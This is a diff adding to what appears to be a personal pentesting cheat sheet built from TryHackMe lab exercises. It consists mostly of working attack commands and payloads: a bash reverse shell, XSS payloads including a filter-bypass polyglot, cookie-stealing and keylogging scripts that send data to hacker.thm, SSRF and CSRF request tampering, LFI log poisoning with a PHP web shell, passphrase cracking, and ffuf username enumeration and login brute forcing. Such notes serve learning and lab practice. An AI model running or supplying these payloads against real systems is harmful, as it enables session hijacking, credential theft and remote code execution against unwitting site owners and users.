@@ -41,8 +41,15 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt
 ### GPG, PGP
 
 ```
-gpg --import priv.key
-gpg <filename>.gpg
+gpg --import priv.key(or .asc)
+gpg <filename>.gpg(or <filename>.pgp)
+```
+
+To crack passphrase, 
+
+```
+pgp2john <file>.asc > hash.txt
+john -w <wordlist_path>.txt hash.txt
 ```
 
 
@@ -193,6 +200,8 @@ rsync -av authorized_keys rsync://username@<IP>/home_user/.ssh
 
 First, check /opt and /etc/<service> 
 
+If you need to move other containers, you need to open new shell.
+
 ### SUID/GUID
 
 - To search the a system for  files with SUID/GUID
@@ -232,7 +241,7 @@ ls -l /usr/local/bin/overwrite.sh
 replace the contents of overwrite.sh to below.
 
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+bash -i >& /dev/tcp/10.13.35.230/4444 0>&1
 
 #### PATH variable
 
@@ -1244,6 +1253,24 @@ misc::skeleton
 
 # Web
 
+## Subdomain
+
+`-site:www.tryhackme.com site:\*.tryhackme.com` in Google
+
+### DNS Bruteforce
+
+```bash
+dnsrecon -t brt -d acmeitsupport.thm
+```
+
+### Sublist3r
+
+```bash
+./sublist3r.py -d acmeitsupport.thm
+```
+
+
+
 ## Shells
 
 ### netcat 
@@ -1297,6 +1324,34 @@ misc::skeleton
 
 
 ## XSS
+
+xsshunter
+
+`<script>alert('XSS');</script>`
+
+If there's function like `user.changeEmail()` usen, 
+
+try `<script>user.changeEmail('attacker@hacker.thm'); </script>`
+
+`/images/cat.jpg" onload="alert('THM');`
+
+### Polyglots
+
+Payload which escape attributes, tags and bypass filters 
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
+
+
+
+### Session Stealing
+
+`<script>fetch('https://hacker.thm/steal?cookie='+btoa(document.cookie));</script>`
+
+### Key Logger
+
+`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
 
 ### Cookie
 
@@ -1422,7 +1477,81 @@ Response;
 
 password hashes
 
+## SSRF
 
+- Expected req: `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`
+
+  Hacker req: `http://website.thm/stock?url=http://api.website.thm/api/user`
+
+  Web req: `http://api.website.thm/api/user`
+
+- Expected req: `http://website.thm/stock?url=/item?id=123`
+
+  Hacker req: `http://website.thm/stock?url=/../user`
+
+  Web req: `http://api.website.thm/api/stock/../user`
+
+- Expected req: `http://website.thm/stock?server=api&id=123`
+
+  Hacker req: `http://website.thm/stock?server=api.website.thm/api/user&x=&id=123`
+
+  Web req: `http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123`
+
+- Expected req: `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`
+
+  Hacker req: `http://website.thm/stock?url=http://hackerdomain.thm/`
+
+  Get data like API keys
+
+- Inspect radio buttons and change value to `x/../private` and submit, then inspect again, the value shows the content of /private 
+
+## CSRF
+
+- Burp Suite
+
+  ```
+  POST /customers/reset?email=robert%40acmeitsupport.thm HTTP/1.1
+  Host: 10.10.165.153
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  Origin: http://10.10.165.153
+  Connection: close
+  Referer: http://10.10.165.153/customers/reset?email=robert%40acmeitsupport.thm
+  Cookie: admin=false
+  Upgrade-Insecure-Requests: 1
+  
+  username=robert
+  ```
+
+  Change `username=robert` to 
+
+  `username=robert&email=steve%40customer.acmeitsupport.thm`
+
+- Curl
+
+  ```bash
+  curl 'http://10.10.165.153/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=steve@customer.acmeitsupport.thm'
+  ```
+
+## LFI
+
+If php filter exists: `http://<ip>/?view=php://filter/convert.base64-encode/resource=index`
+
+### FLI2RCE(Log Poisoning)
+
+Burp suit to catch GET request, access to /var/log/apache2/access.log and change user agent to `<?php system($_GET['c']); ?>`
+
+And then, execute commands with url. 
+
+Ex. `?view=../../../../var/log/apache2/cat/../access.log&ext&c=ls`
+
+## RFI
+
+If already complete log poisoning, do `curl http://<ip>:<port>/<file> -o <file>` to download files.
 
 
 
@@ -1509,13 +1638,43 @@ evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 # OSINT
 
+### fuff
+
+- Subdomain
+
+  ```
+  ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.127.35 -fs <size>
+  ```
+
+- Username
+
+  ```
+  ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/signup -mr "username already exists"
+  ```
+
+- Passwords
+
+  ```
+  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/login -fc 200
+  ```
+
+  
+
 ## Files
 
 ### exiftool
 
 ```
-exiftool <filepath>
+exiftool <file_path>
 ```
+
+delete all metadata
+
+```
+exiftool -all= <file_path>
+```
+
+
 
 ### hexedit
 
@@ -1543,7 +1702,9 @@ search locations with BSSID
 
 # Others
 
-- If IP addr doesn't work, edit /etc/hosts
+- If IP doesn't work, edit `/etc/hosts`; in windows, `c:\windows\system32\drivers\etc\hosts`
+
+  
 
 ## Python
 
